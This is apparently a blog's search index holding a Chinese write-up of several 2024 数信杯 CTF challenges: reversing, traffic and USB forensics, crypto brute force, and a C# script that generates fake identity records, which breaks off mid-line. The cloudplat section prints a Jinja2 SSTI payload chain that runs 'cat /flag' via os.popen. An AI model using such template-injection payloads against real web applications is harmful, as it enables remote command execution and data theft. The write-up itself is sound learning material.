<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024数信杯WP</title>
    <link href="/blog/wp/2024%E6%95%B0%E4%BF%A1%E6%9D%AFWP/"/>
    <url>/blog/wp/2024%E6%95%B0%E4%BF%A1%E6%9D%AFWP/</url>
    
    <content type="html"><![CDATA[<h2 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h2><p>pyc逆向，通过用字节码翻译出源代码，发现只是一个随机数的异或，因为异或是对称的，所以直接跑一下加密逻辑就能出flag</p><p><img src="https://s2.loli.net/2024/04/14/sVvl8PwnFX3LDG7.png" alt="image-20240414103303188"></p><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> random<br><span class="hljs-comment"># enc=[0x5d,0x76,0x55,0x4f,0x32,0x10,0x7d,0x20,0x79,0x64,0x7d,0x3f,0x7a,0x1a,0x5c,0x06,0x30,0x14,0x47,0x49,0x78,0x0d,0x0a,0x6a,0x1d,0x3e,0x42,0x50]</span><br><span class="hljs-comment"># # def encrypt_file(file_path):</span><br><span class="hljs-comment"># #     random.seed(114514)</span><br><span class="hljs-comment"># # # WARNING: Decompyle incomplete</span><br><br><span class="hljs-comment"># # file_path = &#x27;./flag&#x27;</span><br><span class="hljs-comment"># # encrypt_file(file_path)</span><br><span class="hljs-comment"># def decrypt_file(enc):</span><br><span class="hljs-comment">#     random.seed(114514)</span><br><span class="hljs-comment">#     a=random.randint(0,128)</span><br><span class="hljs-comment">#     for i in range(0,len(enc)):</span><br><span class="hljs-comment">#         enc[i] = enc[i] ^ a    </span><br><span class="hljs-comment">#     for i in range(0,len(enc)):</span><br><span class="hljs-comment">#         print(chr(enc[i]),end=&#x27;&#x27;)</span><br><br><span class="hljs-comment"># decrypt_file(enc)</span><br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_file</span>(<span class="hljs-params">file_path</span>):<br>    random.seed(<span class="hljs-number">114514</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        data = file.read()<br>    <br>    encrypted_data = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br>        encrypted_byte = <span class="hljs-built_in">chr</span>(byte ^ key).encode()<br>        encrypted_data += encrypted_byte<br>    <br>    encrypted_file_path = file_path + <span class="hljs-string">&#x27;.enc&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(encrypted_file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> encrypted_file:<br>        encrypted_file.write(encrypted_data)<br>    <br>    <span class="hljs-keyword">return</span> encrypted_file_path<br><br>encrypt_file(<span class="hljs-string">r&quot;C:\Users\15003\Downloads\pyc\flag.enc&quot;</span>)<br>   <br><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/14/ipDqydPJSoF6GK1.png" alt="image-20240414103353022"></p><h2 id="MWatch"><a href="#MWatch" class="headerlink" title="MWatch"></a>MWatch</h2><p>查看ATT包可以看见两个设备名称和Redmi K40和 Mi Smart Band5，继续跟进可以看见heart rate</p><p>在一些八十多的里面可以看见一个异常的128</p><p>结合就能得到flag</p><p><img src="https://s2.loli.net/2024/04/14/XaWE3GylirewSBq.png" alt="image-20240414120457312"></p><p><img src="https://s2.loli.net/2024/04/14/qLsWrVtheCAZH4y.png" alt="image-20240414120603989"></p><h2 id="SU7"><a href="#SU7" class="headerlink" title="SU7"></a>SU7</h2><p>先对流量包中can流量根据操作码进行分类，写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 指定文本文件路径</span><br>file_path = <span class="hljs-string">&#x27;data.txt&#x27;</span><br><span class="hljs-comment"># 指定结果文件路径</span><br>result_file_path = <span class="hljs-string">&#x27;result.txt&#x27;</span><br><span class="hljs-comment"># 分类字典，用于存储按分类标准分类后的数据</span><br>categories = &#123;&#125;<br><span class="hljs-comment"># 打开文本文件并按行读取数据</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>  lines = file.readlines()<br><span class="hljs-comment"># 遍历每一行数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>  <span class="hljs-comment"># 提取种类信息</span><br>  category = line.split(<span class="hljs-string">&#x27;#&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">25</span>:].strip()<br>  <span class="hljs-comment"># 将数据根据分类标准进行分类</span><br>  <span class="hljs-keyword">if</span> category <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> categories:<br>    categories[category] = []<br>  categories[category].append(line)<br><span class="hljs-comment"># 打开结果文件并将分类结果写入</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(result_file_path, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> result_file:<br>  <span class="hljs-keyword">for</span> category, lines <span class="hljs-keyword">in</span> categories.items():<br>    result_file.write(<span class="hljs-string">f&quot;Category <span class="hljs-subst">&#123;category&#125;</span>:\n&quot;</span>)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>      result_file.write(line)<br>    result_file.write(<span class="hljs-string">&quot;\n&quot;</span>)<br>    <br></code></pre></td></tr></table></figure><p>分类后看到244操作码中数据段有不同长度的情况</p><p><img src="https://s2.loli.net/2024/04/14/cKAqQ87GEWtZIYD.png" alt="image-20240414174212866"></p><p>大部分数据段都是5位16进制，有差异部分为6位16进制</p><p>在6位16进制数据中有一条F6的数据</p><p><img src="https://s2.loli.net/2024/04/14/sDRJFK1NPk9obva.png" alt="image-20240414174221041"></p><p>提交这条F6的数据</p><p>(1705919249.882828) vcan0 244#000000F60000</p><h2 id="幻方"><a href="#幻方" class="headerlink" title="幻方"></a>幻方</h2><p>通过md5后得到一个3x3的数组</p><p>只需要填补X的位置的值使得行，列对角线的值相加相等</p><p>可以通过使用z3一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> digits,ascii_letters,punctuation<br><br>sh=remote(<span class="hljs-string">&quot;IP&quot;</span>,PORT)<br>result=sh.recvuntil(<span class="hljs-string">&quot;(&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br>a=sh.recvuntil(<span class="hljs-string">&quot;)&quot;</span>)<br>enc=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># print(a)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> a[i]!=a[<span class="hljs-built_in">len</span>(a)-<span class="hljs-number">1</span>]:<br>        enc+=<span class="hljs-built_in">chr</span>(a[i])<br><span class="hljs-built_in">print</span>(enc)<br><br><br>sha=sh.recvuntil(<span class="hljs-string">b&quot;[+] Pl&quot;</span>)<br><span class="hljs-comment"># print(sha)</span><br>sha256=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>,<span class="hljs-built_in">len</span>(sha)):<br>    <span class="hljs-keyword">if</span> sha[i]!=sha[-<span class="hljs-number">7</span>]:<br>        sha256+=<span class="hljs-built_in">chr</span>(sha[i])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span>    <br><span class="hljs-built_in">print</span>(sha256)<br><br>seee=ascii_letters+digits+punctuation<br>strlist=itertools.product(seee,repeat=<span class="hljs-number">4</span>)<br>xxxx=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> str_1 <span class="hljs-keyword">in</span> strlist:<br>    tmp=str_1[<span class="hljs-number">0</span>]+str_1[<span class="hljs-number">1</span>]+str_1[<span class="hljs-number">2</span>]+str_1[<span class="hljs-number">3</span>]<br>    m=hashlib.sha256((tmp+enc).encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> m==sha256:<br>        xxxx=tmp<br>        <span class="hljs-keyword">break</span><br>    <br><span class="hljs-comment"># print(xxxx.encode())</span><br>sh.sendline(xxxx.encode())<br><span class="hljs-comment"># sh.interactive()</span><br><span class="hljs-comment">#########################################</span><br>rubbish=sh.recvline()<br>line1=sh.recvline()<br>line2=sh.recvline()<br>line3=sh.recvline()<br><span class="hljs-built_in">print</span>(line1)<br><span class="hljs-built_in">print</span>(line2)<br><span class="hljs-built_in">print</span>(line3)<br>data=[]<br>line1=line1.decode().split()<br>line2=line2.decode().split()<br>line3=line3.decode().split()<br><span class="hljs-built_in">print</span>(line1)<br><span class="hljs-built_in">print</span>(line2)<br><span class="hljs-built_in">print</span>(line3)<br>data=[]<br>data.append(line1)<br>data.append(line2)<br>data.append(line3)<br><span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-comment">############################</span><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>count=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">if</span> data[i][j]!=<span class="hljs-string">&#x27;X&#x27;</span>:<br>            data[i][j]=<span class="hljs-built_in">int</span>(data[i][j])<br>        <span class="hljs-keyword">else</span>:<br>            count=count+<span class="hljs-number">1</span><br><br>result=[<span class="hljs-number">0</span>]*count<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>    result[i]=Int(<span class="hljs-string">&quot;result[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&quot;</span>)<br><br>s=Solver()<br>p=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">if</span> data[i][j]==<span class="hljs-string">&#x27;X&#x27;</span>:<br>            data[i][j]=result[p]<br>            p=p+<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        s.add(<span class="hljs-built_in">sum</span>(data[i][k] <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>))==<span class="hljs-built_in">sum</span>(data[i+<span class="hljs-number">1</span>][k] <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        s.add(<span class="hljs-built_in">sum</span>(data[k][i] <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>))==<span class="hljs-built_in">sum</span>(data[k][i+<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)))<br><br>s.add(data[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]+data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]+data[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>]==data[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]+data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]+data[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>])<br><span class="hljs-keyword">if</span> s.check()==sat:<br>    k=s.model()<br>    e=<span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(k)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(data[i][j])==<span class="hljs-built_in">int</span>:<br>               <span class="hljs-keyword">continue</span><br>            data[i][j]=k[result[e]].as_long()<br>            e=e+<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(data)<br><br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">b&quot; &quot;</span>)<br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">&quot; &quot;</span>)<br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">b&quot;\n&quot;</span>)<br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">b&quot; &quot;</span>)<br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">b&quot; &quot;</span>)<br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">b&quot;\n&quot;</span>)<br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">b&quot; &quot;</span>)<br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">b&quot; &quot;</span>)<br>sh.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br>sh.send(<span class="hljs-string">b&quot;\n&quot;</span>)<br>sh.interactive()<br><br><br><br></code></pre></td></tr></table></figure><h2 id="fun"><a href="#fun" class="headerlink" title="fun"></a>fun</h2><p>xyz都在一百以内</p><p>aes是使用随机的key</p><p>seed是xyz的和</p><p>所以遍历0-300用爆破解出flag</p><p><img src="C:/Users/15003/AppData/Roaming/Typora/typora-user-images/image-20240414163121905.png" alt="image-20240414163121905"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999</span>):<br>    <span class="hljs-keyword">try</span>: <br>        random.seed(seed)<br>        key = random.randbytes(<span class="hljs-number">16</span>)<br>        PATH=<span class="hljs-string">r&quot;D:\xxx\test\encrypted_flag.bin&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(PATH, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> file_in:<br>           nonce = file_in.read(<span class="hljs-number">16</span>)<br>           tag = file_in.read(<span class="hljs-number">16</span>)<br>           ciphertext = file_in.read()<br>        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)<br>        data=cipher.decrypt_and_verify(ciphertext, tag)<br>        <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">continue</span><br><br><br></code></pre></td></tr></table></figure><h2 id="messagebox"><a href="#messagebox" class="headerlink" title="messagebox"></a>messagebox</h2><p><img src="https://s2.loli.net/2024/04/14/kKjOE9A6QH7J8VB.png" alt="image.png"></p><p><img src="https://s2.loli.net/2024/04/14/xB8b9QIurlhFi5W.png" alt="image.png"></p><p><img src="https://s2.loli.net/2024/04/14/xh5J9Eml8UFvXbj.png" alt="image.png"></p><h2 id="cloudplat"><a href="#cloudplat" class="headerlink" title="cloudplat"></a>cloudplat</h2><p><img src="https://s2.loli.net/2024/04/14/RMPpgrql2CNcQ1A.png" alt="image.png"></p><p><img src="https://s2.loli.net/2024/04/14/LUDI4oc7FZKVvfd.png" alt="image.png"></p><blockquote><p>密码2b97cb3305e4b85ba2ba904cecff5601，登录<br>审计发现area拼接id后存在ssti，各限制长度20<br>采用多次update，最后拼接绕过</p></blockquote><p><img src="https://s2.loli.net/2024/04/14/vE4sCoM8aK9P2jt.png" alt="image.png"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&gt; 先发1、2，即</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.update</span>(<span class="hljs-name">p</span>=request.args[&#x27;0&#x27;])&#125;&#125;</span><span class="language-xml">，get传参?0=cat+/flag</span><br><span class="language-xml">&gt; 将p定义为命令cat /flag</span><br><span class="language-xml"></span><br><span class="language-xml">&gt; 再发3、4，即</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.update</span>(<span class="hljs-name">g</span>=lipsum.\_\_globals\_\_)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&gt; 将g定义为lipsum.\_\_globals\_\_</span><br><span class="language-xml"></span><br><span class="language-xml">&gt; 最后发5、6执行命令，即</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.g.os.popen</span>(<span class="hljs-name">config.p</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&gt; 拼起来即为：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>.\_\_globals\_\_.os.popen(<span class="hljs-name">cat</span> /flag).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="usb"><a href="#usb" class="headerlink" title="usb"></a>usb</h2><p><img src="https://s2.loli.net/2024/04/14/nkpIFwKRqU5oTPX.png" alt="image.png"></p><blockquote><p>搜索发现hid data,然后过滤出相应的包。</p></blockquote><p><img src="https://s2.loli.net/2024/04/14/oAeUrLGEjgODyHc.png" alt="image.png"></p><blockquote><p>导出包，然后打开查看到Leftover Capture data。</p></blockquote><p><img src="https://s2.loli.net/2024/04/14/OE67jJld31xZSXi.png" alt="image.png"></p><blockquote><p>依次记录其中第五个和第六个数字，如果两个数字都是00就pass。<br>然后根据字表，转换成相应字符。得到一串少了一位的身份证号码。</p></blockquote><p><img src="https://s2.loli.net/2024/04/14/oODiqKHb9eYjXAd.png" alt="image.png"></p><blockquote><p>找到在线身份证校验网站，得到最后一位缺失数字是3，md5后得到flag。</p><p><img src="https://s2.loli.net/2024/04/14/Xjsh9vEqFnDp8kA.png" alt="image.png"></p></blockquote><h2 id="rwzip"><a href="#rwzip" class="headerlink" title="rwzip"></a>rwzip</h2><blockquote><p>解压发现有密码，工具爆破出密码是114514</p></blockquote><p><img src="https://s2.loli.net/2024/04/14/jDM6ThUwgaqH1FZ.png" alt="image.png"></p><blockquote><p>打开里面的flag.txt文件，发现字符有点怪，经观察发现是只需要字母镜像翻转。</p></blockquote><p><img src="https://s2.loli.net/2024/04/14/U4qIoPzBXp18T7c.png" alt="image.png"></p><h2 id="定向数据采集"><a href="#定向数据采集" class="headerlink" title="定向数据采集"></a>定向数据采集</h2><p>根据提示，发1000个合法数据包即可</p><p>需要校验身份证信息，编写脚本生成并自动发送</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System.Net.Http.Json;<br><span class="hljs-keyword">using</span> System.Text.Json.Serialization;<br><span class="hljs-keyword">using</span> Bogus;<br><br><br><span class="hljs-keyword">var</span> users = <span class="hljs-keyword">new</span> Faker&lt;User&gt;(<span class="hljs-string">&quot;zh_CN&quot;</span>);<br><span class="hljs-built_in">int</span> a = <span class="hljs-number">10000</span>;<br><span class="hljs-keyword">var</span> generator = users<br>        .RuleFor(t =&gt; t.Gender, f =&gt; f.PickRandom&lt;Gender&gt;())<br>        .RuleFor(t =&gt; t.Name, (f,u) =&gt; f.Person.FullName)<br>        .RuleFor(u=&gt;u.Birth, f=&gt; f.Person.DateOfBirth)<br>        .RuleFor(t=&gt;t.Phone,f=&gt;<span class="hljs-string">$&quot;139888<span class="hljs-subst">&#123;a++&#125;</span>&quot;</span>)<br>        .RuleFor(t=&gt;t.Ethnicity, f=&gt;<span class="hljs-string">&quot;汉族&quot;</span>)<br>        .RuleFor(t=&gt;t.IdCard, (f, u)=&gt;genIdCard(u))<br>        .RuleFor(t=&gt;t.Address, f=&gt;f.Person.Address.ToString())<br>        .RuleFor(t=&gt;t.Position, <span class="hljs-string">&quot;打安全打的&quot;</span>)<br>    ;<br><br>Console.WriteLine(<span class="hljs-string">&quot;请输入你的目标:&quot;</span>);<br><span class="hljs-keyword">var</span> url = Console.ReadLine();<br><span class="hljs-keyword">var</span> result = generator.Generate(<span class="hljs-number">2000</span>);<br><span class="hljs-keyword">var</span> httpClient = <span class="hljs-keyword">new</span> HttpClient();<br><span class="hljs-built_in">int</span> cnt = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> user <span class="hljs-keyword">in</span> result)<br>&#123;<br>   <span class="hljs-keyword">var</span> res = <span class="hljs-keyword">await</span> 